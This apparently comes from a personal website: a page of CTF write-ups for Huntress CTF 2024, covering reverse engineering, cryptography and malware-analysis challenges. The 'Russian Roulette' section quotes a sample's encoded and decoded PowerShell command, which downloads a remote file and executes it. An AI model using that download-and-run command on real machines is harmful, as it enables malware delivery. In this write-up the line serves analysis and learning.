@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico" />
+  <title>Jonathan Gutzmer - Write-ups</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+  <!-- Side Navigation -->
+  <nav class="side-nav d-flex flex-column align-items-center">
+    <div class="tabs d-flex justify-content-between w-100">
+      <a href="/home.html" class="tab-btn btn btn-light flex-grow-1">Home</a>
+      <a href="/write-ups.html" class="tab-btn active btn btn-light flex-grow-1">Write-ups</a>
+    </div>
+    <ul id="nav-links" class="mt-5">
+      <li><a href="#ctf-writeups">CTF Write-ups</a></li>
+      <li><a href="#malware-writeups">Malware Write-ups</a></li>
+    </ul>
+    <div class="social-buttons mt-auto">
+      <a href="https://linkedin.com/in/lankedin" target="_blank" class="social-btn">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+          <path
+            d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
+        </svg>
+      </a>
+      <a href="https://github.com/dummy/" target="_blank" class="social-btn">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+          <path
+            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+        </svg>
+      </a>
+    </div>
+  </nav>
+
+  <div id="main-content" class="bg-lightblue">
+    <section id="ctf-writeups" class="content-section">
+      <h2>CTF Write-ups</h2>
+      <div class="accordion" id="ctfAccordion">
+        <!-- Huntress CTF 2024 -->
+        <div class="accordion-item">
+          <h2 class="accordion-header" id="ctf1Heading">
+            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+              data-bs-target="#ctf1Collapse" aria-expanded="false" aria-controls="ctf1Collapse">
+              <div class="ctf-header">
+                <span class="ctf-name">Huntress CTF</span>
+                <div class="ctf-date">October 1 - October 31, 2024</div>
+              </div>
+            </button>
+          </h2>
+          <div id="ctf1Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1Heading"
+            data-bs-parent="#ctfAccordion">
+            <div class="accordion-body">
+              <div class="accordion" id="ctf1Challenges">
+                <!-- #1 OceanLocust -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal1Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal1Collapse" aria-expanded="false" aria-controls="ctf1chal1Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">OceanLocust</span>
+                        <span class="challenge-category">Reverse Engineering</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal1Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal1Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>Wow-ee zow-ee!! Some advanced persistent threats have been doing some tricks with hiding
+                        payloads in image files!</p>
+                      <p>We thought we would try our hand at it too.</p>
+                      <h4>Solution</h4>
+                      <p>I went for a solution to this challenge that didn't involve reverse engineering the program,
+                        but the encrypted image the program produced. The challenge came with two files: one with debug
+                        symbols, and another stripped of them. Using this approach, it doesn't matter which version is
+                        used.</p>
+                      <p>After researching how data can be stored in .png files, I used <a
+                          href="https://www.nayuki.io/page/png-file-chunk-inspector" target="_blank"
+                          rel="noopener noreferrer">this website</a>. I uploaded the provided image file and a png image
+                        that I took, with no hidden payload.</p>
+                      <p>The image I uploaded had normal .png "chunks": <code>IHDR</code>, <code>sRGB</code>,
+                        <code>gAMA</code>, <code>pHYs</code>, <code>IDAT</code>, and <code>IEND</code>, while the
+                        challenge image had several custom chunks added: <code>biTa</code>, <code>biTb</code>,
+                        <code>biTc</code>, <code>biTd</code>, <code>biTe</code>, <code>biTf</code>, <code>biTg</code>,
+                        and <code>biTh</code>, each with 5 bytes of data (5 bytes * 8 chunks = 40 characters, perfect
+                        for the 38 character flag).
+                      </p>
+                      <p>Using the website, this is what one of the chunks looked like, and what each byte corresponds
+                        to. More information can be found <a
+                          href="https://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html" target="_blank"
+                          rel="noopener noreferrer">here</a>.</p>
+                      <img src="images/DataChunk.png" />
+                      <p>In order, the 40 bytes of data are:
+                        <code>04 05 35 06 19 04 0c 37 5a 55 01 5f 6d 53 00 5a 0c 37 5c 06 54 5c 36 5d 00 00 58 64 03 07 55 0b 36 51 57 06 59 29 c2 c8</code>.
+                      </p>
+                      <p>After this, I took a look at what the program did when run. It asks for a file, and text input.
+                        To start, I ran the program with a copy of my clean image and 40 1's. The data result from this
+                        was:
+                        <code>53 58 65 50 53 53 58 65 53 53 53 58 65 52 53 53 58 65 55 53 53 58 65 54 53 53 58 65 57 53 53 58 65 56 53 53 58 65 59 53</code>.
+                      </p>
+                      <p>Simulating what may have been done originally, I gave it a copy of my clean .png image, and the
+                        text flag{1234567890qwertyuiopasdfghjklzxc}. The data result from this was:
+                        <code>04 05 35 06 19 04 05 35 06 19 54 5e 6c 5a 52 13 1e 31 16 16 1b 1c 3d 0a 12 03 1a 30 00 05 03 1a 30 00 05 1a 0a 29 c2 c8</code>
+                      </p>
+                      <p>This second try confirmed my suspicion that it was encoded flag data, as the first 5 bytes in
+                        my attempt and the provided image were the same: <code>04 05 35 06 19</code>, corresponding to
+                        flag{.</p>
+                      <p>From here, I XOR'd
+                        <code>31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31</code>
+                        (40 1's) and
+                        <code>53 58 65 50 53 53 58 65 53 53 53 58 65 52 53 53 58 65 55 53 53 58 65 54 53 53 58 65 57 53 53 58 65 56 53 53 58 65 59 53</code>
+                        using <a href="https://xor.pw/#" target="_blank" rel="noopener noreferrer">xor.pw</a> to get the
+                        key, which is:
+                        <code>62695461626269546262626954636262695464626269546562626954666262695467626269546862</code>.
+                      </p>
+                      <p>Then, I XOR'd the key and the data from the original file to get the flag (in hex):
+                        <code>666c61677b66656338376336393062386563386436356238626231306565376262363564307daaaa</code>.
+                        Translate that into ASCII and you'll have the flag, followed by two filler bytes.
+                      </p>
+                      <p>Interestingly, the XOR key in ASCII was just the PNG chunk headers with an extra 'b':
+                        <code>biTabbiTbbbiTcbbiTdbbiTebbiTfbbiTgbbiThb</code>.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #2 Stack It -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal2Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal2Collapse" aria-expanded="false" aria-controls="ctf1chal2Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Stack It</span>
+                        <span class="challenge-category">Reverse Engineering</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal2Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal2Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>Our team of security analysts recently worked through a peculiar Lumma sample.</p>
+                      <p>The dentists helping us advised we floss at least twice a day to help out.</p>
+                      <p>He also gave us this weird file. Maybe you can help us out.</p>
+                      <h4>Solution</h4>
+                      <p>The description of the challenge seems to not-so-subtly hint about using <code>Floss</code>.
+                        Looking through the output, there is a string <code>1ecff8bece9486287dc76521a84bb7c0</code>, but
+                        it is a fake flag.</p>
+                      <p>Since that didn't lead to anything, I moved to Ghirda and pwndbg. In Ghidra, there's only one
+                        function, the entry function. Copying the address of this function, I opened pwndbg and set a
+                        breakpoint at the address.</p>
+                      <p>After that, I stepped through the program, until the flag was fully revealed in memory.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #3 GoCrackMe1 -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal3Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal3Collapse" aria-expanded="false" aria-controls="ctf1chal3Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">GoCrackMe1</span>
+                        <span class="challenge-category">Reverse Engineering</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal3Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal3Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>TENNNNNN-HUT!</p>
+                      <p>Welcome to the Go Dojo, gophers in training!</p>
+                      <p>Go malware is on the rise. So we need you to sharpen up those Go reverse engineering skills.
+                        We've written three simple CrackMe programs in Go to turn you into Go-binary reverse engineering
+                        ninjas!</p>
+                      <p>First up is the easiest of the three. Go get em!</p>
+                      <h4>Solution</h4>
+                      <p>The file given is named <code>GoCrackMe1</code> with no file extension. Running it through
+                        <code>file</code> reveals that it is a ELF 64-bit LSB executable.
+                      </p>
+                      <p>When run, the file gives <code>Access Denied!</code>.</p>
+                      <p>To start, I opened it in Cutter in write mode, and went to the <code>dbg.main.main</code>
+                        function, as symbols weren't stripped from this file.</p>
+                      <p>At the end of the function there are three interesting code blocks:</p>
+                      <img src="images/GCM1.jpg" />
+                      <p>The first block makes a call to <code>dbg.main.checkCondition</code>, then makes a jump
+                        depending on the result. The function on the right loads data and prints it, then ends. The
+                        function on the left, loads data, calls an interesting <code>dbg.runtime.convTstring</code>
+                        function, then prints the output. This is likely the flag function.</p>
+                      <p>Reversing the jump in the top block confirms that the left block was the flag function, as the
+                        flag now prints when running the file.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #4 GoCrackMe2 -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal4Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal4Collapse" aria-expanded="false" aria-controls="ctf1chal4Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">GoCrackMe2</span>
+                        <span class="challenge-category">Reverse Engineering</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal4Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal4Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>Not bad gophers, but that one was the easiest of the three! How will you do against something a
+                        little more involved? I wouldn't expect to get any help from debugging symbols on this one...
+                      </p>
+                      <h4>Solution</h4>
+                      <p>Again, the file we are given is a 64-bit ELF file written in Go. When I ran it for the first
+                        time, it printed out a small portion of the flag. I ran the program again, and it gave another
+                        snippet. I wrote a simple bash script to run the file repeatedly and found that it will output
+                        the following 'chunks' of the flag:</p>
+                      <p><code>flag{</code>, <code>57fc4d2324</code>, <code>f750878</code>, and <code>f390751}</code>
+                      </p>
+                      <p>Very rarely, it would print out all of those in one string:
+                        <code>flag{f75087857fc4d2324f390751}</code>. However, this is 30 of the 38 characters needed for
+                        a legitimate flag.
+                      </p>
+                      <p>I opened the file in Cutter in write mode and went to the main function. Inside the main
+                        function, there is a code block that calls <code>sym.go.math_rand.Float64</code>, then makes a
+                        jump that skips a large section of code. </p>
+                      <p>I reversed the jump to point it towards the section it was skipping, saved the file, then ran
+                        the shell script again.</p>
+                      <p>This change caused the program to output sections of the flag again, but some were the full
+                        flag length, just without <code>flag{</code>. The missing chunk was <code>1dc09666</code>.
+                        Putting that in order with the rest of the chunks found earlier gives us the full flag.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #5 No Need for Brutus -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal5Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal5Collapse" aria-expanded="false" aria-controls="ctf1chal5Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">No Need for Brutus</span>
+                        <span class="challenge-category">Cryptography</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal5Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal5Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>A simple message for you to decipher:</p>
+                      <p>squiqhyiiycfbudeduutvehrhkjki</p>
+                      <p>Submit the original plaintext hashed with MD5, wrapped between the usual flag format: flag{}
+                      </p>
+                      <h4>Solution</h4>
+                      <p>
+                        From the provided text, it looks like a simple Caesar Cipher challenge. I opened up
+                        <a href="https://gchq.github.io/CyberChef/" target="_blank"
+                          rel="noopener noreferrer">CyberChef</a>,
+                        pasted in the text, and applied the <code>ROT13 Brute Force</code> recipe.
+                      </p>
+                      <p>This revealed <code>caesarissimplenoneedforbrutus</code> after 10 rotations.</p>
+                      <p>Per the instructions, I then used the <code>MD5</code> recipe on the plaintext to get the flag.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #6 Unbelievable -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal6Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal6Collapse" aria-expanded="false" aria-controls="ctf1chal6Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Unbelievable</span>
+                        <span class="challenge-category">Warmups</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal6Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal6Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>Don't believe everything you see on the Internet!</p>
+                      <p>Anyway, have you heard this intro soundtrack from Half-Life 3?</p>
+                      <h4>Solution</h4>
+                      <p>The challenge provided a file named <code>Half-Life_3_OST.mp3</code>. When analyzed with the
+                        <code>file</code> utility, it reveals that the file is actually a <code>.png</code> file. Change
+                        the extension to <code>.png</code>, open the file, and there's the flag.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #7 Strange Calc -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal7Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal7Collapse" aria-expanded="false" aria-controls="ctf1chal7Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Strange Calc</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal7Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal7Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>I got this new calculator app from my friend! But it's really weird, for some reason it needs
+                        admin permissions to run??</p>
+                      <h4>Solution</h4>
+                      <p>The challenge file is <code>calc.exe</code>, which is confirmed to be a Windows executable
+                        after using <code>file</code>.</p>
+                      <p>Using <code>capa</code> on the executable, we find out that it is packed. I used
+                        <code>upx -d</code> to unpack it, and re-ran capa. This time, it identified the file as
+                        "compiled with AutoIt", and that it could not analyze the file automatically.
+                      </p>
+                      <p>After some research, I found <a href="https://github.com/daovantrong/myAutToExe"
+                          target="_blank" rel="noopener noreferrer">MyAutToEXE</a>, which is a AutoIt decompiler.</p>
+                      <p>Uploading the <code>calc.exe</code> into <code>myAut2Exe.exe</code>, it produced the following
+                        code:</p>
+                      <img src="images/CalcCode.jpg" />
+                      <p>Using <a href="https://gchq.github.io/CyberChef/" target="_blank"
+                          rel="noopener noreferrer">CyberChef</a>'s <code>Magic</code> operator, it outputs the
+                        following code:</p>
+                      <img src="images/CalcCodeB.jpg" />
+                      <p></p>
+                      <p>This code looks like obfuscated JavaScript, so I uploaded it to <a
+                          href="https://deobfuscate.io/" target="_blank" rel="noopener noreferrer">deobfuscate.io</a>
+                        and got the following:</p>
+                      <img src="images/CalcCodeC.jpg" />
+                      <p>Using ChatGPT, I had it create a Python script that decoded and printed the flag from here.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #8 Russian Roulette -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal8Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal8Collapse" aria-expanded="false" aria-controls="ctf1chal8Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Russian Roulette</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal8Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal8Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes
+                        it just crashes my computer!?!?! :(</p>
+                      <p>WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon
+                        invocation there is a real possibility that your VM may crash.</p>
+                      <h4>Solution</h4>
+                      <p>Well this one sounds fun.</p>
+                      <p>Starting off, we have a <code>Windows Powershell.lnk</code> file. Looking at the properties,
+                        the file runs the following command:
+                        <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=</code>
+                      </p>
+                      <p>When base64 decoded, that invokes
+                        <code>iwr is.gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd</code>. This downloads a file using iwr
+                        (Invoke-WebRequest), stores it in $env:TMP, and executes the file using <code>;&</code>.
+                      </p>
+                      <p>By just running everything up until the <code>;&</code> execution, we can download the second
+                        file to analyze it.</p>
+                      <p>Running <code>file</code> on the second file reveals it Little Endian UTF16 encoded. Opening
+                        the file in a text editor reveals a lot of foreign characters.</p>
+                      <p>Since it is unreadable in the current state, I uploaded it to <a
+                          href="https://tria.ge/dashboard" target="_blank" rel="noopener noreferrer">Tria.ge</a>.
+                        Looking through the analysis, there is another <code>powershell -e</code> invocation, this time
+                        with a significantly larger payload.</p>
+                      <p>Decoding that payload, we get:</p>
+                      <img src="images/RRCodeA.jpg" />
+                      <p>This code tells us two things:</p>
+                      <p>1. It contains a Shot() function that has a 1 in 6 chance to cause a BSOD. This is what the
+                        description was referencing.</p>
+                      <p>2. There is a base64 encoded, AES encrypted string, and everything needed to decrypt it. Using
+                        ChatGPT, I got the following code, which produced the flag:</p>
+                      <img src="images/RRCodeB.jpg" />
+                    </div>
+                  </div>
+                </div>
+                <!-- #9 Discount Programming Devices -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal9Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal9Collapse" aria-expanded="false" aria-controls="ctf1chal9Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Discount Programming Devices</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal9Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal9Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>I used a tool on the internet to obfuscate my script!</p>
+                      <p>But I lost it, and I don't know how to get it back.</p>
+                      <p>Maybe you can help?</p>
+                      <h4>Solution</h4>
+                      <p>
+                        This challenge gave a <code>.py</code> file that contains a compressed base64 encoded string.
+                        Simply running this script, such as using a tool like
+                        <a href="https://www.online-python.com" target="_blank"
+                          rel="noopener noreferrer">online-python.com</a>, will reveal the flag.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #10 X-RAY -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal10Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal10Collapse" aria-expanded="false" aria-controls="ctf1chal10Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">X-RAY</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal10Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal10Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>The SOC detected malware on a host, but antivirus already quarantined it... can you still make
+                        sense of what it does?</p>
+                      <h4>Solution</h4>
+                      <p>The file for this challenge is called <code>x-ray</code>, with no extension. Running
+                        <code>file</code> on it reveals that it is a data file. Nothing of use can be extracted by
+                        <code>strings</code> or opening it in a text editor
+                      </p>
+                      <p>With the context of this file being a quarantined file, we can use <code>DeXRAY</code>, a
+                        program installed by default on REMnux.</p>
+                      <p>After using <code>DeXRAY</code> on the original file, it outputs a new file with a
+                        <code>.out</code> extension. Using <code>file</code> again, we find out that it is a
+                        <code>.dll</code> file. So I transferred it back to FlareVM for further analysis.
+                      </p>
+                      <p>Since it is a <code>.dll</code> file, I opened it in <code>dnSpy</code>. Drilling down into the
+                        file, we find three interesting functions:</p>
+                      <img src="images/xraycode.jpg" />
+                      <p>Using ChatGPT, I converted the code to Python and ran it using <a
+                          href="https://www.online-python.com" target="_blank"
+                          rel="noopener noreferrer">online-python.com</a>. </p>
+                      <p>More information about the DeXRAY tool can be found in
+                        <a href="https://www.youtube.com/watch?v=K60kriw4o44" target="_blank"
+                          rel="noopener noreferrer">this John Hammond video</a>.
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #11 eepy -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal11Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal11Collapse" aria-expanded="false" aria-controls="ctf1chal11Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Eepy</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal11Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal11Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>*yawn* why am i so eeeeeeeeepy?</p>
+                      <h4>Solution</h4>
+                      <p>The file given is a <code>.exe</code> file. I first ran <code>file</code> on the executable to
+                        confirm that it was a Windows executable.</p>
+                      <p>Once confirmed, I ran <code>floss</code> on the file, which revealed the flag.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #12 Eco-Friendly -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal12Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal12Collapse" aria-expanded="false" aria-controls="ctf1chal12Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Eco-Friendly</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal12Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal12Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>This sample is good for the environment!</p>
+                      <h4>Solution</h4>
+                      <p>This challenge provides a <code>eco_friendly</code> file with no extension. After using
+                        <code>file</code> on it, we find out it's a PowerShell file.
+                      </p>
+                      <p>NOTE: If analyzing this in FlareVM, the results of these steps will not work properly due to
+                        the custom environment variables in the VM. I used a standard Windows 10 VM for these steps.</p>
+                      <p>Inside, the file starts with <code>iex</code>, followed by an extremely long file of obfuscated
+                        code. By changing <code>iex</code> to <code>Write-Host</code>, we can then run the file to see
+                        what the obfuscated code prints.</p>
+                      <p>When run, the code prints out obfuscated code, starting with <code>iex</code> again. So we
+                        change it to <code>Write-Host</code> and run it again.</p>
+                      <p>Keep repeating these steps, and the code eventually prints the flag.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #13 Ping Me -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal13Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal13Collapse" aria-expanded="false" aria-controls="ctf1chal13Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Ping Me</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal13Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal13Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>We found this file in the autoruns of a host that seemed to have a lot of network activity...
+                        can you figure out what it was doing?</p>
+                      <h4>Solution</h4>
+                      <p>The challenge provided a <code>.vbs</code> file containing several <code>chr</code> functions,
+                        which converts an ANSI code to a readable character. Rather than manually decoding the file, I
+                        put <code>result =</code> at the beginning of the file, and added
+                        <code>WScript.Echo result</code> to the end of the file.
+                      </p>
+                      <p>Running this modified file, it prints the following:</p>
+                      <img src="images/PingMeCode.jpg" />
+                      <p>Pinging these IPs, there is no results.</p>
+                      <p>However, when we replace all periods with spaces and remove all other non-numeric characters
+                        from the IP list, then use <a href="https://gchq.github.io/CyberChef/" target="_blank"
+                          rel="noopener noreferrer">CyberChef</a>'s <code>Magic</code> operator, the flag reveals itself
+                        if we use the <code>From Decimal</code> operator.</p>
+                    </div>
+                  </div>
+                </div>
+                <!-- #14 Rustline -->
+                <div class="accordion-item">
+                  <h2 class="accordion-header" id="ctf1chal14Heading">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+                      data-bs-target="#ctf1chal14Collapse" aria-expanded="false" aria-controls="ctf1chal14Collapse">
+                      <div class="challenge-header">
+                        <span class="challenge-name">Rustline</span>
+                        <span class="challenge-category">Malware</span>
+                      </div>
+                    </button>
+                  </h2>
+                  <div id="ctf1chal14Collapse" class="accordion-collapse collapse" aria-labelledby="ctf1chal14Heading"
+                    data-bs-parent="#ctf1Challenges">
+                    <div class="accordion-body">
+                      <h4>Challenge Description</h4>
+                      <p>Jerry: A Redline Stealer.</p>
+                      <p>George: Written in Rust.</p>
+                      <p>Jerry: A Rusty Redline Stealer.</p>
+                      <p>George: A Rusty Redline Stealer, Jerry!</p>
+                      <p>We caught a Redline variant executing on an endpoint and intercepted the encrypted files as
+                        they traversed the edge proxy. Well, everything except for the flag.txt file (imagine that...).
+                        Any chance you could figure out how this thing works and recover the flag? NOTE: Archive
+                        password is rustline</p>
+                      <h4>Solution</h4>
+                      <p>The challenge <code>.zip</code> contains three things: an <code>Application.docx.scr</code>
+                        file, a <code>challenge-files</code> folder, and an <code>encrypted-files</code> folder</p>
+                      <p>Besides the <code>flag.txt</code> file, the same files are in each folder, but with one folder
+                        having encrypted contents.</p>
+                      <p>Rather than reverse engineer the application file to get the encryption key, we can solve this
+                        challenge by comparing the encrypted and unencrypted versions of a file. By opening both version
+                        in <code>HxD</code>, we can copy the hex values into
+                        <a href="https://xor.pw/" target="_blank" rel="noopener noreferrer">xor.pw</a> to get the XOR
+                        key.
+                      </p>
+                      <p>The results of this operation on the <code>password.txt</code> file gives us the XOR key of
+                        <code>b8f72ff695587745b08fdc8ee71adf7e</code>, repeated 2.5 times.
+                      </p>
+                      <p>Using this key, we can decrypt the <code>flag.txt</code> file by XORing the key with the hex
+                        values of the encrypted flag file. Using the same website produces an error, but
+                        <a href="https://www.dcode.fr/xor-cipher" target="_blank"
+                          rel="noopener noreferrer">dcode.fr</a>'s XOR decoder produces the flag, surrounded by Lorem
+                        Ipsum text.'
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="ctf-certificate mt-4">
+                <h5>Team Certificate</h5>
+                <img src="images/Breach-Point-Certificate.png" alt="CTF Certificate for CTF NAME" class="img-fluid rounded border shadow-sm" style="max-width: 500px; height: auto;" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
